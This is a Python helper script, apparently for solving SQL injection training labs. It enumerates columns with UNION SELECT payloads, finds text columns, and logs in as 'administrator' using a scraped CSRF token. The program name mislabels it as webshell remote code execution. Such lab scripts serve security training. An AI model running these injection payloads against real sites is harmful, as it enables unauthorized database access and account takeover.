import requests
import argparse
from lxml import html
import re
from typing import List, Tuple


# Creating a Session Object
# https://docs.python-requests.org/en/latest/api/#request-sessions
SESSION = requests.Session()

LOGIN_CSRF_XPATH = '//input[@name="csrf"]/@value'


def generate_parser() -> argparse.Namespace:
    parser = argparse.ArgumentParser(prog="Remote Code Execution Via Webshell Upload")
    parser.add_argument(
        "-u", "--lab-url", help="Your lab instance URL is required", required=True
    )

    return parser.parse_args()


def get_csrf_token(body: str, xpath: str) -> str:
    tree = html.fromstring(body)

    return tree.xpath(xpath)[0]


def check_is_lab_solved(lab_url: str):
    print("[+] Checking whether the lab is solved or not...")

    if "Congratulations, you solved the lab!" in SESSION.get(lab_url).text:
        print("[+] Lab is solved Successfully")
    else:
        print("[-] Lab is not solved yet")


DEFAULT_FETCH_TARGET_STRING_PATTERN = (
    r"Make\sthe\sdatabase\sretrieve\sthe\sstring:\s'(.+?)'"
)


def fetch_target_string(
    lab_url: str,
    pattern: str = DEFAULT_FETCH_TARGET_STRING_PATTERN,
) -> str:
    print("[+] Fetching the string that is to be queried from the database")

    response = re.search(
        pattern,
        SESSION.get(lab_url).text,
    )

    target_string = ""

    if response:
        target_string = response.group(1)
    else:
        print("[-] Failed to get the string to be queried")
        exit()

    print(f"[+] String to be queried from database: {target_string}")

    return target_string


def find_no_of_columns(lab_url_with_end_point: str, comment: str = "--") -> int:
    print("[+] Determining the number of columns using UNION SELECT...")

    columns = 1

    while True:
        payload = ", ".join(["NULL"] * columns)
        query = f"' UNION SELECT {payload}{comment}"

        print(f"[+] Making Query {columns}: {lab_url_with_end_point}{query}")

        if SESSION.get(f"{lab_url_with_end_point}{query}").status_code == 200:
            break
        else:
            columns += 1

    print(f"[+] The number of columns found using UNION SELECT is {columns}")

    return columns


def find_columns_of_type_string(
    lab_url_with_end_point: str, no_of_columns: int, comment: str = "--"
) -> list[int]:
    print("[+] Finding columns containing text...")

    target_columns = []

    for i in range(no_of_columns):
        payload = ", ".join(
            ["'string'" if i == j else "NULL" for j in range(no_of_columns)]
        )

        query = f"' UNION SELECT {payload}{comment}"

        print(f"[+] Making Query {i}: {lab_url_with_end_point}/filter?category={query}")

        if SESSION.get(f"{lab_url_with_end_point}{query}").status_code == 200:
            target_columns.append(i)
        else:
            continue

    print(
        f"[+] The columns containing text are: {', '.join(list(map(str, target_columns)))} (Index starts from 0!)"
    )

    return target_columns


def print_table(column_names: List[str], rows: List[Tuple[str, ...]]) -> None:
    columns_width = max(len(cell) for row in rows for cell in row)
    divider = "|-" + "-|-".join(["-" * columns_width] * len(column_names)) + "-|"

    print(divider)
    print(
        "| "
        + " | ".join(map(lambda col: col.center(columns_width, " "), column_names))
        + " |"
    )
    print(divider)

    for row in rows:
        print(
            "| " + " | ".join([cell.center(columns_width, " ") for cell in row]) + " |"
        )

    print(divider)


def login_as_administrator(lab_url: str, password: str):
    print("[+] Now logging in as administrator")

    # Extracting the login form csrf token using xpath
    login_csrf_token = get_csrf_token(
        # Fetching the login page to get the login page csrf token and parsing it with lxml to generate a tree
        SESSION.get(url=f"{lab_url}/login").text,
        LOGIN_CSRF_XPATH,
    )
    print(f"[+] Login CSRF Token: {login_csrf_token}")

    response = SESSION.post(
        url=f"{lab_url}/login",
        data={
            "username": "administrator",
            "password": password,
            "csrf": login_csrf_token,
        },
    )

    if response.status_code == 200:
        if "Your username is: administrator" in response.text:
            print("[+] Logged in as administrator successfully")
        else:
            print("[-] Failed to login as administrator; Probably password is wrong")
            exit()

    else:
        print("[-] Failed to login as administrator")
        exit()
